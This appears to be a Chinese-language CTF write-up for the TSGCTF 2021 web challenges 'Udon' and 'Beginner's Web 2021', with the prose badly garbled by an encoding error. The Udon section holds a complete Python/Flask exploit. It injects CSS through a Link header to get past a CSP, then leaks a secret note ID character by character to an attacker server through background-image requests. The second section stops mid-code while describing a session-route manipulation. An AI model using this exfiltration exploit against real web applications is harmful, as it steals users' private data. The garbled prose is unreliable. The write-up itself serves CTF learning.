&lt;p>&lt;code>TSGCTF{M4king_We6_ch4l1en9e_i5_1ik3_playing_Jenga}&lt;/code>&lt;/p>
&lt;h2 id="webudon">Web/Udon&lt;/h2>
&lt;blockquote>
&lt;p>&lt;strong>Ta-dah! Here comes udon!&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>Udon NoteÔºå‰∏ÄÁúºxss‰πãÁ±ªÁöÑ&lt;/p>
&lt;p>Êàë‰ª¨ÂèëÂá∫ÂéªÁöÑnote‰∏≠ÁöÑÂ∞ñÊã¨Âè∑‰ºöË¢´ËΩ¨‰πâ‰∏∫ÂÆû‰ΩìÂ≠óÁ¨¶ÔºåReset‰ºöÊ∏ÖÁ©∫cookieÔºåËøûÂ∏¶ÁùÄÊ∂àÂ§±‰πãÂâçÂèëÂ∏ÉËøáÁöÑNote&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004080116886.png" alt="image-20211004080116886">&lt;/p>
&lt;p>ÊúâTell Admin About This Udon NoteÁöÑÈÄâÈ°π&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîÊ≤°‰ªÄ‰πàÊÉ≥Ê≥ï ‰ª•‰∏ãÊòØÂπ≥Ê∑°ÁöÑÂ§çÁé∞ËøáÁ®ã&lt;/p>
&lt;p>ÁúãÊ∫êÁ†ÅÔºåmain.go&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004155626744.png" alt="image-20211004155626744">&lt;/p>
&lt;p>Êàë‰ª¨ÈúÄË¶ÅÊâæÂà∞ÈÇ£‰∏™ÁâπÊÆäÁöÑnotes_id&lt;/p>
&lt;p>Êé•ÁùÄÂæÄ‰∏ãÁúã&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004155826973.png" alt="image-20211004155826973">&lt;/p>
&lt;p>httpÁöÑÁõ∏Â∫îÂ§¥ÂèØ‰ª•Ê≥ÑÈú≤‰∏Ä‰∫õ‰ø°ÊÅØÔºåËøôÈáåÊòØÂÖ•ÊâãÁÇπ&lt;/p>
&lt;p>‰ªÖÂú®Firefox‰∏≠Êúâ‰∏Ä‰∏™&lt;code>Link&lt;/code>ËØ∑Ê±ÇÂ§¥ÔºåÂá†‰πéÁ≠âÂêå‰∫éHTML‰∏≠ÁöÑ&lt;code>&amp;lt;link&amp;gt;&lt;/code>Ê†áÁ≠æ&lt;/p>
&lt;pre tabindex="0">&lt;code>Link: &amp;lt;/foo.css&amp;gt;; rel=&amp;quot;stylesheet&amp;quot;; type=&amp;quot;text/css&amp;quot;
&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;/foo.css&amp;quot;&amp;gt;
&lt;/code>&lt;/pre>&lt;p>Êàë‰ª¨ÂèØ‰ª•Âêëapp‰∏≠ÁöÑ‰ªªÊÑè‰∏ÄÈ°µÊ≥®ÂÖ•‰ªªÊÑèÁöÑcss&lt;/p>
&lt;p>ÂêåÊó∂‰πüÊúâÈúÄË¶ÅBypassÁöÑÂú∞ÊñπÔºåÊØîÂ¶ÇËøôÈáåÁöÑCSPÁ≠ñÁï•&lt;code>style-src 'self'&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004160452260.png" alt="image-20211004160452260">&lt;/p>
&lt;p>Êàë‰ª¨ÂèØ‰ª•ÂÖàÂàõÂª∫‰∏Ä‰∏™Â∏¶ÊúâÊÅ∂ÊÑècssÁöÑnoteÔºåÂÜçÂ∞ÜËøô‰∏™noteÁöÑÈìæÊé•ÊîæÂÖ•&lt;code>Link&lt;/code>ËØ∑Ê±ÇÂ§¥‰∏≠&lt;/p>
&lt;pre tabindex="0">&lt;code>http://ip:port/?k=Link&amp;amp;v=%3C%2F(&amp;lt;URL of a note with styles to inject&amp;gt;)%3E%3B%20rel%3D%22stylesheet%22%3B%20type%3D%22text%2Fcss%22
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># exp.py&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">urllib.parse&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;span style="color:#111">TARGET_BASE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://localhost:8080&amp;#34;&lt;/span>
&lt;span style="color:#111">LEAK_LENGTH&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>
&lt;span style="color:#111">CHAR_CANDIDATES&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ascii_letters&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digits&lt;/span>
&lt;span style="color:#111">EXPLOIT_BASE_ADDR&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://host.docker.internal:1337&amp;#34;&lt;/span>
&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Session&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">build_payload&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">prefix&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">candidates&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;List[str]&amp;#34;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">global&lt;/span> &lt;span style="color:#111">EXPLOIT_BASE_ADDR&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">EXPLOIT_BASE_ADDR&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;EXPLOIT_BASE_ADDR is not set&amp;#34;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">candidate&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">candidates&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">id_prefix_to_try&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">prefix&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">candidate&lt;/span>
&lt;span style="color:#111">matcher&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">map&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">lambda&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">hex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:],&lt;/span> &lt;span style="color:#d88200">&amp;#39;/notes/&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">id_prefix_to_try&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">&amp;#34;a[href^=&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">matcher&lt;/span> &lt;span style="color:#f92672">+&lt;/span> \
&lt;span style="color:#d88200">&amp;#34;] { background-image: url(&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">EXPLOIT_BASE_ADDR&lt;/span> &lt;span style="color:#f92672">+&lt;/span> \
&lt;span style="color:#d88200">&amp;#34;/leak?q=&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">id_prefix_to_try&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;); }&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">post_note&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">title&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">description&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">TARGET_BASE&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;/notes&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;title&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">title&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;description&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">description&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;content-type&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;application/x-www-form-urlencoded&amp;#34;&lt;/span>
&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">allow_redirects&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">status_code&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;invalid status code: &lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">status_code&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;Location&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/notes/&amp;#39;&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">report_note_as_stylesheet&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">id&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">header_value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;/notes/&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;gt;; rel=&amp;#34;stylesheet&amp;#34;; type=&amp;#34;text/css&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">id&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">TARGET_BASE&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;/tell&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;path&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;/?k=Link&amp;amp;v=&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">header_value&lt;/span>&lt;span style="color:#111">)),&lt;/span>
&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">allow_redirects&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">status_code&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;invalid status code: &lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">status_code&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">None&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/start&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">build_payload&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">CHAR_CANDIDATES&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">exploit_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">post_note&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exploit&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">report_note_as_stylesheet&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exploit_id&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[info]: started exploit with a new note: &lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">/notes/&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">TARGET_BASE&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">exploit_id&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/leak&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">leak&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">leaked_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;q&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">leaked_id&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">LEAK_LENGTH&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] leaked (full ID): &lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">leaked_id&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">TARGET_BASE&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;/notes/&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">leaked_id&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[info] leaked: &lt;/span>&lt;span style="color:#d88200">{}{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">leaked_id&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;*&amp;#34;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">LEAK_LENGTH&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">leaked_id&lt;/span>&lt;span style="color:#111">))))&lt;/span>
&lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">build_payload&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">leaked_id&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">CHAR_CANDIDATES&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">exploit_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">post_note&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exploit&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">report_note_as_stylesheet&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exploit_id&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[info]: invoked crawler with a new note: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">exploit_id&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[info] running app ...&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;0.0.0.0&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ËØ¶ÁªÜÂÜÖÂÆπÂèÇËßÅ-&amp;gt;&lt;a href="https://diary.shift-js.info/tsgctf-2021-udon/">wp&lt;/a>&lt;/p>
&lt;h2 id="webbeginners-web-2021">Web/Beginner&amp;rsquo;s Web 2021&lt;/h2>
&lt;blockquote>
&lt;p>&lt;strong>Made drunk, so solved drunk.&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004080745266.png" alt="image-20211004080745266">&lt;/p>
&lt;p>Áªô‰∫ÜÊ∫êÁ†ÅÔºåÁúã‰∏ãindex.jsÔºåemmmmmmÔºåÂàõÂª∫‰∫Üsession.routes&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004081546667.png" alt="image-20211004081546667">&lt;/p>
&lt;p>‰ΩÜÊòØflagÂπ∂‰∏ç‰ºöÂú®ÊúÄÂêéÊ∏≤ÊüìÁöÑroute‰∏≠Âá∫Áé∞&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004092636947.png" alt="image-20211004092636947">&lt;/p>
&lt;p>ÊâÄ‰ª•Êàë‰ª¨ÊÉ≥Âà©Áî®GetSaltÂ§ÑÁöÑ&lt;code>session.salt='flag'&lt;/code>Êù•ËΩ¨Âà∞flagÁöÑË∑ØÁî±‰∏äÊù•Ëé∑Âæóflag&lt;/p>
&lt;p>‰ΩÜÊòØ[salt]‰ºöÂØºËá¥ÈáçÂÜôflagÔºåÊâÄ‰ª•Êàë‰ª¨ÊÉ≥Ë¶ÅÁöÑsessionÊòØËøôÊ†∑ÁöÑÁä∂ÊÄÅ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">routes&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span>
&lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span>
&lt;span style="color:#111">...&lt;/span>
&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span> &lt;span style="color:#75715e">// salt is anything different from &amp;#39;flag&amp;#39;
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">},&lt;/span>
&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;flag&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>È¶ñÂÖàÁî®&lt;code>GET /?action=SetSalt&amp;amp;data=flag&lt;/code>Êù•ËÆ©&lt;code>salt='flag'&lt;/code>Ôºåsession‰ºöÂèòÊàêËøôÊ†∑&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">route&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span> &lt;span style="color:#75715e">// this route is overwritten and not accessible
